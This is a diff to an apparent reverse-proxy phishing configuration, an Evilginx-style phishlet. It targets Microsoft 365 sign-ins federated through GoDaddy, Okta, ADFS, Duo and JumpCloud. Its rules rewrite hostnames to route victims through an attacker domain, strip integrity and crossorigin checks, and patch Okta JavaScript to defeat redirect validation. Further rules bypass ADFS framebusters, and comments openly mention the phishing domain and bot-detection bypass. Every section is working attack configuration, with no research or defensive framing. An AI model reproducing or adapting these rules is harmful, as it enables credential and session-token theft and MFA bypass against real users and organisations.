+  - { triggers_on: "outlook.office.com", orig_sub: "outlook", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+
+  - { triggers_on: "outlook.office365.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "outlook", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  - { triggers_on: "login.microsoft.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoft.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoft.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoft.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoft.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoft.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoft.com", orig_sub: "outlook", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoft.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoft.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "github.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "github", domain: "githubassets.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "avatars", domain: "githubusercontent.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "collector", domain: "github.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "api", domain: "github.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: 'https%3A%2F%2F{hostname}/', replace: 'https%3A%2F%2F{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  # NOTE: {domain} filters REMOVED - they replaced ALL godaddy.com occurrences
+  # including unknown subdomains (e.g. q08u.godaddy.com → q08u.montechristo.biz = blank page)
+  # Known subdomains are handled by specific filters + auto_filter; unknowns by catch-all below
+
+  # -------------------------------------------------------------------------
+  # GODADDY SSO - Integrity/Crossorigin bypass (CRITICAL)
+  # -------------------------------------------------------------------------
+  - {triggers_on: 'sso.godaddy.com', orig_sub: '', domain: '', search: 'integrity="', replace: 'xintegrity="', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: '', domain: '', search: ' crossorigin', replace: ' xcrossorigin', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'idp.godaddy.com', orig_sub: '', domain: '', search: 'integrity="', replace: 'xintegrity="', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'idp.godaddy.com', orig_sub: '', domain: '', search: ' crossorigin', replace: ' xcrossorigin', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'login.godaddy.com', orig_sub: '', domain: '', search: 'integrity="', replace: 'xintegrity="', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'login.godaddy.com', orig_sub: '', domain: '', search: ' crossorigin', replace: ' xcrossorigin', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'gui.godaddy.com', orig_sub: '', domain: '', search: 'integrity="', replace: 'xintegrity="', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'gui.godaddy.com', orig_sub: '', domain: '', search: ' crossorigin', replace: ' xcrossorigin', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'sso.secureserver.net', orig_sub: '', domain: '', search: 'integrity="', replace: 'xintegrity="', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'sso.secureserver.net', orig_sub: '', domain: '', search: ' crossorigin', replace: ' xcrossorigin', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'idp.secureserver.net', orig_sub: '', domain: '', search: 'integrity="', replace: 'xintegrity="', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'idp.secureserver.net', orig_sub: '', domain: '', search: ' crossorigin', replace: ' xcrossorigin', mimes: ['text/html', 'application/javascript']}
+  
+  # -------------------------------------------------------------------------
+  # GODADDY SSO - Domain replacements (Verified via Playwright Analysis)
+  # -------------------------------------------------------------------------
+  # From Microsoft to GoDaddy
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'sso\.godaddy\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'idp', domain: 'godaddy.com', search: 'idp\.godaddy\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'godaddy.com', search: 'login\.godaddy\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'account', domain: 'godaddy.com', search: 'account\.godaddy\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'mya', domain: 'godaddy.com', search: 'mya\.godaddy\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'gui', domain: 'godaddy.com', search: 'gui\.godaddy\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'csp', domain: 'godaddy.com', search: 'csp\.godaddy\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'img1', domain: 'wsimg.com', search: 'img1\.wsimg\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'img6', domain: 'wsimg.com', search: 'img6\.wsimg\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  # Catch-all: unknown GoDaddy subdomains in Microsoft federation responses (e.g. q08u.godaddy.com)
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'sso', domain: 'godaddy.com', search: '[a-z0-9.-]+\.godaddy\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  # Catch-all: unknown SecureServer subdomains in Microsoft federation responses
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'sso', domain: 'secureserver.net', search: '[a-z0-9.-]+\.secureserver\.net', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  
+  # GoDaddy internal domain rewrites (from sso.godaddy.com context)
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: 'gui\.godaddy\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'csp', domain: 'godaddy.com', search: 'csp\.godaddy\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'img1', domain: 'wsimg.com', search: 'img1\.wsimg\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'img6', domain: 'wsimg.com', search: 'img6\.wsimg\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'www', domain: 'godaddy.com', search: 'www\.godaddy\.com', replace: 'www.godaddy.com', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  # GoDaddy SSO - all known subdomain rewrites (MUST be before catch-all)
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'sso\.godaddy\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'idp', domain: 'godaddy.com', search: 'idp\.godaddy\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'login', domain: 'godaddy.com', search: 'login\.godaddy\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'account', domain: 'godaddy.com', search: 'account\.godaddy\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'mya', domain: 'godaddy.com', search: 'mya\.godaddy\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'events.api', domain: 'godaddy.com', search: 'events\.api\.godaddy\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  # Catch-all: route unknown GoDaddy cluster endpoints (e.g. q08u) through sso proxy
+  # Kasada fingerprint path rewrite for bot bypass (MUST be before catch-all)
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'g.sst', domain: 'godaddy.com', search: 'g\.sst\.godaddy\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  # GoDaddy to secureserver.net rewrites (MUST be before catch-all)
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'secureserver.net', search: 'sso\.secureserver\.net', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'idp', domain: 'secureserver.net', search: 'idp\.secureserver\.net', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'login', domain: 'secureserver.net', search: 'login\.secureserver\.net', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'auth', domain: 'secureserver.net', search: 'auth\.secureserver\.net', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  # Catch-all: route unknown GoDaddy cluster endpoints (e.g. q08u) through sso proxy
+  # Runs AFTER specific filters above have already replaced known subdomains
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: '[a-z0-9.-]+\.godaddy\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  # Catch-all: route unknown SecureServer endpoints through sso-ss proxy
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'secureserver.net', search: '[a-z0-9.-]+\.secureserver\.net', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  
+  # GoDaddy page redirects back to Microsoft
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'login\.microsoftonline\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'idp.godaddy.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'login\.microsoftonline\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.godaddy.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'login\.microsoftonline\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'gui.godaddy.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'login\.microsoftonline\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  
+  # SecureServer.net back to GoDaddy/Microsoft
+  - {triggers_on: 'sso.secureserver.net', orig_sub: 'sso', domain: 'godaddy.com', search: 'sso\.godaddy\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'sso.secureserver.net', orig_sub: 'idp', domain: 'godaddy.com', search: 'idp\.godaddy\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'sso.secureserver.net', orig_sub: 'login', domain: 'microsoftonline.com', search: 'login\.microsoftonline\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'idp.secureserver.net', orig_sub: 'login', domain: 'microsoftonline.com', search: 'login\.microsoftonline\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.secureserver.net', orig_sub: 'login', domain: 'microsoftonline.com', search: 'login\.microsoftonline\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'auth.secureserver.net', orig_sub: 'login', domain: 'microsoftonline.com', search: 'login\.microsoftonline\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  
+  # Microsoft to secureserver.net rewrites
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'sso', domain: 'secureserver.net', search: 'sso\.secureserver\.net', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'idp', domain: 'secureserver.net', search: 'idp\.secureserver\.net', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'secureserver.net', search: 'login\.secureserver\.net', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'auth', domain: 'secureserver.net', search: 'auth\.secureserver\.net', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  
+  # GoDaddy/SecureServer redirect_only filters (CRITICAL for 302 redirects)
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login\.microsoftonline\.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  - {triggers_on: 'idp.godaddy.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login\.microsoftonline\.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  - {triggers_on: 'login.godaddy.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login\.microsoftonline\.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  - {triggers_on: 'sso.secureserver.net', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login\.microsoftonline\.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  - {triggers_on: 'idp.secureserver.net', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login\.microsoftonline\.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  - {triggers_on: 'login.secureserver.net', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login\.microsoftonline\.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  - {triggers_on: 'auth.secureserver.net', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login\.microsoftonline\.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  
+  # Microsoft to GoDaddy redirect rewrites  
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://sso\.godaddy\.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'idp', domain: 'godaddy.com', search: 'https://idp\.godaddy\.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'sso', domain: 'secureserver.net', search: 'https://sso\.secureserver\.net', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'idp', domain: 'secureserver.net', search: 'https://idp\.secureserver\.net', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  
+  # GoDaddy internal redirects
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'secureserver.net', search: 'https://sso\.secureserver\.net', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'idp', domain: 'secureserver.net', search: 'https://idp\.secureserver\.net', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  - {triggers_on: 'sso.secureserver.net', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://sso\.godaddy\.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  - {triggers_on: 'sso.secureserver.net', orig_sub: 'idp', domain: 'godaddy.com', search: 'https://idp\.godaddy\.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+
+  # =========================================================================
+  # OKTA - CORS Bypass (redirect URI replacement in Okta Sign-In Widget JS)
+  # Fixes redirect_uri validation by replacing phishing domain with real Okta domain
+  # =========================================================================
+  - triggers_on: 'ok14static.oktacdn.com'
+    orig_sub: ''
+    domain: 'okta.com'
+    search: 'array"\);var t='
+    replace: 'array");e.redirectUri=e.redirectUri.replace("{basedomain}","{orig_domain}");var t='
+    mimes: ['application/javascript']
+  # OKTA - Strip integrity hash from sign-in widget script tag
+  - triggers_on: '{okta_org}.okta.com'
+    orig_sub: ''
+    domain: 'okta.com'
+    search: 'integrity="[^"]*"'
+    replace: 'integrity=""'
+    mimes: ['text/html', 'charset=utf-8']
+  # OKTA - Disable dynamic integrity check in JS
+  - triggers_on: '{okta_org}.okta.com'
+    orig_sub: ''
+    domain: 'okta.com'
+    search: 'mainScript\.integrity'
+    replace: 'mainScript.inteegrity'
+    mimes: ['text/html', 'charset=utf-8']
+  # OKTA - Fix fetch URL building (replace real domain with phishing domain in fetch calls)
+  - triggers_on: 'ok14static.oktacdn.com'
+    orig_sub: ''
+    domain: 'okta.com'
+    search: 'var s=\(n\.g\.fetch\|\|h\(\)\)\(t'
+    replace: 't=t.replace("{orig_domain}","{domain}");var s=(n.g.fetch||h())(t'
+    mimes: ['application/javascript']
+  # OKTA - Fix issuer origin for redirect URI validation (ok14static CDN)
+  - triggers_on: 'ok14static.oktacdn.com'
+    orig_sub: ''
+    domain: 'okta.com'
+    search: ',l\.src=e\.getIssuerOrigin\(\)'
+    replace: ',l.src=e.getIssuerOrigin().replace("{orig_domain}","{domain}")'
+    mimes: ['application/javascript']
+  # OKTA - Fix issuer origin (ok9static CDN variant)
+  - triggers_on: 'ok9static.oktacdn.com'
+    orig_sub: ''
+    domain: 'okta.com'
+    search: ',l\.src=e\.getIssuerOrigin\(\)'
+    replace: ',l.src=e.getIssuerOrigin().replace("{orig_domain}","{domain}")'
+    mimes: ['application/javascript']
+  # OKTA ↔ Microsoft cross-domain rewrites
+  - {triggers_on: '{okta_org}.okta.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/ion+json']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: '{okta_org}', domain: 'okta.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  # OKTA - Integrity/crossorigin bypass on Okta CDN
+  - {triggers_on: 'ok14static.oktacdn.com', orig_sub: '', domain: '', search: 'crossorigin', replace: 'xcrossorigin', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'ok9static.oktacdn.com', orig_sub: '', domain: '', search: 'crossorigin', replace: 'xcrossorigin', mimes: ['text/html', 'application/javascript']}
+
+  # =========================================================================
+  # ADFS - Framebuster bypass and domain rewrites
+  # =========================================================================
+  # ADFS ↔ Microsoft cross-domain rewrites
+  - {triggers_on: '{adfs_sub}.{adfs_domain}', orig_sub: 'login', domain: 'microsoftonline.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: '{adfs_sub}', domain: '{adfs_domain}', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  # ADFS - Framebuster self===top bypass
+  - {triggers_on: '{adfs_sub}.{adfs_domain}', orig_sub: '', domain: '', search: 'if(e.self===e.top){', replace: 'if(true){window.oldself=e.self;e.self=e.top;', mimes: ['text/html', 'application/javascript', 'text/javascript']}
+  # ADFS - Framebuster target="_top" removal
+  - {triggers_on: '{adfs_sub}.{adfs_domain}', orig_sub: '', domain: '', search: 'method="post" target="_top"', replace: 'method="post"', mimes: ['text/html']}
+  # ADFS - Integrity/crossorigin bypass
+  - {triggers_on: '{adfs_sub}.{adfs_domain}', orig_sub: '', domain: '', search: 'crossorigin', replace: 'xcrossorigin', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: '{adfs_sub}.{adfs_domain}', orig_sub: '', domain: '', search: 'integrity', replace: 'xintegrity', mimes: ['text/html', 'application/javascript']}
+  # ADFS → Microsoft redirect_only
+  - {triggers_on: '{adfs_sub}.{adfs_domain}', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login\.microsoftonline\.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+
+  # =========================================================================
+  # DUO SECURITY - Cross-domain rewrites and integrity bypass
+  # =========================================================================
+  - {triggers_on: '{duo_api}.duosecurity.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: '{duo_api}', domain: 'duosecurity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: '{duo_sso}.duosecurity.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: '{duo_sso}', domain: 'duosecurity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  # DUO - Integrity/crossorigin bypass
+  - {triggers_on: '{duo_api}.duosecurity.com', orig_sub: '', domain: '', search: 'crossorigin', replace: 'xcrossorigin', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: '{duo_api}.duosecurity.com', orig_sub: '', domain: '', search: 'integrity', replace: 'xintegrity', mimes: ['text/html', 'application/javascript']}
+  # DUO → Microsoft redirect_only
+  - {triggers_on: '{duo_api}.duosecurity.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login\.microsoftonline\.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  - {triggers_on: '{duo_sso}.duosecurity.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login\.microsoftonline\.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  # DUO - ADFS integration (Duo as MFA adapter within ADFS)
+  - {triggers_on: '{adfs_sub}.{adfs_domain}', orig_sub: '{duo_api}', domain: 'duosecurity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: '{duo_api}.duosecurity.com', orig_sub: '{adfs_sub}', domain: '{adfs_domain}', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  # DUO - Okta integration (Duo as MFA for Okta)
+  - {triggers_on: '{okta_org}.okta.com', orig_sub: '{duo_api}', domain: 'duosecurity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: '{duo_api}.duosecurity.com', orig_sub: '{okta_org}', domain: 'okta.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+  # =========================================================================
+  # JUMPCLOUD ↔ Microsoft cross-domain rewrites (shared domain - always active)
+  # =========================================================================
+  - {triggers_on: 'sso.jumpcloud.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'sso', domain: 'jumpcloud.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  # JumpCloud redirect_only
+  - {triggers_on: 'sso.jumpcloud.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login\.microsoftonline\.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'sso', domain: 'jumpcloud.com', search: 'https://sso\.jumpcloud\.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+
+  # =========================================================================
+  # PINGONE ↔ Microsoft cross-domain rewrites (shared domain - always active)
